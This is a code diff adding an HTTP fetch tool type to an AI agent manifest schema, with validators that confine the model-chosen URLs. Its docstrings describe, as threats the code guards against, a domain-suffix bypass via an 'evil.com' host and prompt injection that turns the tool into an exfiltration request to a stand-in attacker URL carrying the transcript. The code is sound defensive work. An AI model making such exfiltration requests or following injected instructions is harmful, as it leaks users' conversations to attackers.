@@ -49,6 +49,12 @@ MAX_INTEGRATION_TIMEOUT_MS = MAX_INTEGRATION_TIMEOUT_S * 1000
 # the per-ref compile cost stands on its own.)
 MAX_REFS = 64
 
+# Ceiling on a single fetched response. The far end chooses how much it sends, so without a
+# cap one call can exhaust the context window or the worker's memory. Generous rather than
+# tight: `spec.artifacts` spills a large tool result to the object store and hands the model
+# a preview, so the useful limit is "will not take the process down", not "will fit inline".
+MAX_FETCH_BYTES = 5_000_000
+
 
 def assert_valid_manifest_name(name: str) -> None:
     if not name or len(name) > 128 or not MANIFEST_NAME_RE.match(name):
@@ -279,6 +285,73 @@ class BrowserToolRef(_Strict):
     timeout_ms: int | None = Field(default=None, gt=0, le=MAX_INTEGRATION_TIMEOUT_MS)
     path_prefix: str = ""
     fatal: bool = False
+
+
+class HttpFetchToolRef(_Strict):
+    """Read a model-supplied URL over HTTP(S).
+
+    The inverse of `McpServerRef`-style integrations and of `HttpExecutor`: the destination
+    is chosen by the model, not the manifest, so `path_prefix` is how an author narrows it
+    back down. Bounded here rather than at the tool because a manifest is the only place
+    that knows what this agent should be allowed to read.
+    """
+
+    name: str = Field(min_length=1)
+    description: str = ""
+    # An operator-set prefix the URL must start with, e.g. "https://docs.felix.run/".
+    # Empty means any address the egress guard permits.
+    path_prefix: str = ""
+
+    @field_validator("path_prefix")
+    @classmethod
+    def _validate_prefix(cls, v: str) -> str:
+        """An absolute http(s) URL, normalised to end in '/'.
+
+        This was the only URL-bearing field on any ref without a validator, and unlike the
+        others it is a *security boundary* rather than a destination. Two failures it let
+        through: `https://docs.felix.run` (no trailing slash) matched
+        `https://docs.felix.run.evil.com/`, the classic domain-suffix bypass; and a prefix
+        with no scheme, or the wrong case, matched nothing at all and turned the tool into
+        one that refuses every call with no signal at author time.
+        """
+        if not v:
+            return v
+        from urllib.parse import urlsplit
+
+        parts = urlsplit(v)
+        if parts.scheme not in ("http", "https") or not parts.netloc:
+            raise ValueError(f"path_prefix must be an absolute http(s) URL, got {v!r}")
+        # Normalising here rather than at match time means the stored manifest says exactly
+        # what will be enforced.
+        return v if v.endswith("/") else v + "/"
+
+    timeout_ms: int | None = Field(default=None, gt=0, le=MAX_INTEGRATION_TIMEOUT_MS)
+    # Response cap. The far end chooses the length, so this bounds both the context window
+    # the result can consume and the memory one call can hold.
+    max_bytes: int | None = Field(default=None, gt=0, le=MAX_FETCH_BYTES)
+    # "text" renders HTML to readable text; "raw" returns the body as served.
+    format: Literal["text", "raw"] = "text"
+    fatal: bool = False
+    # Unrestricted egress has to be typed out. See `_require_a_boundary`.
+    allow_any_host: bool = False
+
+    @model_validator(mode="after")
+    def _require_a_boundary(self) -> HttpFetchToolRef:
+        """A fetch tool with no `path_prefix` is a general-purpose exfiltration primitive.
+
+        Every other outbound ref names an operator-fixed destination; this one lets the model
+        choose, so the defaults decide whether a manifest that says nothing gets the whole
+        public internet. It does not: an author who wants that writes `allow_any_host: true`
+        and can be asked why in review. Fail-closed here costs one line in the manifests that
+        genuinely need open fetching, and prevents the shape where prompt injection turns
+        `fetch_docs` into `GET https://attacker/?d=<transcript>`.
+        """
+        if not self.path_prefix and not self.allow_any_host:
+            raise ValueError(
+                f"http_tools[{self.name!r}]: set a path_prefix to confine the tool, "
+                "or allow_any_host: true to permit any address the egress guard allows"
+            )
+        return self
 
 
 class ClientToolRef(_Strict):
@@ -608,6 +681,7 @@ class Spec(_Strict):
     queues: list[QueueRef] = Field(default_factory=list, max_length=MAX_REFS)
     sandboxes: list[SandboxRef] = Field(default_factory=list, max_length=MAX_REFS)
     browser_tools: list[BrowserToolRef] = Field(default_factory=list, max_length=MAX_REFS)
+    http_tools: list[HttpFetchToolRef] = Field(default_factory=list, max_length=MAX_REFS)
     client_tools: list[ClientToolRef] = Field(default_factory=list, max_length=MAX_REFS)
     sub_agents: list[str] = Field(default_factory=list)
     aggregator_prompt: str = ""
